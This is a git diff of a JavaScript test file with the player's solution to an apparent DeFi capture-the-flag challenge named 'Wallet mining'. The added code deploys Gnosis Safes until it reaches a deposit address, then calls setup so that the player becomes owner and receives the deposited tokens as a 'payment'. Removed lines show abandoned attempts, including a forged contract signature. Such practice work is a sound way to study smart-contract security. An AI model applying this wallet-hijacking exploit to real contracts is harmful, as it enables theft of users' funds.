@@ -123,76 +123,26 @@ describe('[Challenge] Wallet mining', function () {
 
         // all calls to `can(u, a)` will now return true for any u and a
 
-        // deploy all safes prior to the deposit safe
-        for (let i = 0; i < 42; i++) {
+        // deploy all safes, including the deposit safe
+        for (let i = 0; i < 43; i++) {
             // no initialization data is needed
             await walletDeployer.connect(player).drop("0x");
         }
 
-        // the initalization data should drain the deposit address and send the funds to the player
-        const data = "0x";
+        // connect to the wallet of the deposit address
+        const wallet = (await ethers.getContractFactory("GnosisSafe")).attach(DEPOSIT_ADDRESS);
 
-        // deploy the safe of the deposit address and drain the funds to the player
-        await walletDeployer.connect(player).drop(data);
-
-        // const wallet = await (await ethers.getContractFactory("GnosisSafe")).attach(DEPOSIT_ADDRESS);
-
-        // await wallet.connect(player).setup(
-        //     [player.address], // owners
-        //     1, // threshold
-        //     ethers.constants.AddressZero, // to
-        //     "0x", // data
-        //     ethers.constants.AddressZero, // fallbackHandler
-        //     ethers.constants.AddressZero, // paymentToken
-        //     0, // payment
-        //     ethers.constants.AddressZero // paymentReceiver
-        // );
-
-
-        // the initalization data should drain the deposit address and send the funds to the player
-        // // function execTransaction(
-        // //     address to,
-        // //     uint256 value,
-        // //     bytes calldata data,
-        // //     Enum.Operation operation,
-        // //     uint256 safeTxGas,
-        // //     uint256 baseGas,
-        // //     uint256 gasPrice,
-        // //     address gasToken,
-        // //     address payable refundReceiver,
-        // //     bytes calldata signatures
-        // // )
-        // // const execSignature = 
-        // // const validator = await (await ethers.getContractFactory("Validator", player)).deploy();
-
-        // const execData = exploit.interface.encodeFunctionData("drainWallet", [token.address, player.address, DEPOSIT_TOKEN_AMOUNT])
-        // // eth_sign
-        // const execSignature = await player.signMessage(ethers.utils.arrayify(execData));
-
-        // const signerAddress = ethers.utils.verifyMessage(execData, execSignature);
-        // console.log(signerAddress, player.address, await wallet.getOwners());
-
-        // // // forge a contract signature
-        // // const signature = "0x"
-        // //     + validator.address.substring(2).padStart(64, "0") // r: bytes32(validator address)
-        // //     + "0000000000000000000000000000000000000000000000000000000000000041" // s: bytes32(65)
-        // //     + "00" // v: 0
-        // //     + "0000000000000000000000000000000000000000000000000000000000000000"; // contractSignature: bytes32(0)
-
-        // await wallet.connect(player).execTransaction(
-        //     exploit.address, // to
-        //     0, // value
-        //     execData, // data
-        //     0, // operation
-        //     0, // safeTxGas
-        //     0, // baseGas
-        //     0, // gasPrice
-        //     ethers.constants.AddressZero, // gasToken
-        //     ethers.constants.AddressZero, // refundReceiver
-        //     execSignature // signatures
-        // );
-
-        // replay the transaction for 
+        // setup the wallet with the player as the owner and the payment receiver
+        await wallet.connect(player).setup(
+            [player.address], // owners
+            1, // threshold
+            ethers.constants.AddressZero, // to
+            "0x", // data
+            ethers.constants.AddressZero, // fallbackHandler
+            token.address, // paymentToken
+            DEPOSIT_TOKEN_AMOUNT, // payment
+            player.address // paymentReceiver
+        );
     });
 
     after(async function () {
